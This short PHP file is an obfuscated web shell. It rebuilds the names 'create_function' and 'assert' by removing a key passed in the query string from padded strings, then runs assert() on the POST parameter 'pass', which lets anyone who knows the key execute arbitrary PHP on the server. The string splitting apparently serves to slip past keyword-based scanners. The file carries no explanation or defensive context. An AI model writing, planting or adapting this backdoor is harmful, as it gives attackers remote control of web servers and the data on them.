<?php
    $bb = str_replace($_GET['key'],'','create_funcxxxtion');
    $aa = $bb('$a', 'ev'.'al($a);');
    $t = str_replace($_GET['key'],'','assxxxert');
    $t($_POST['pass']);
?>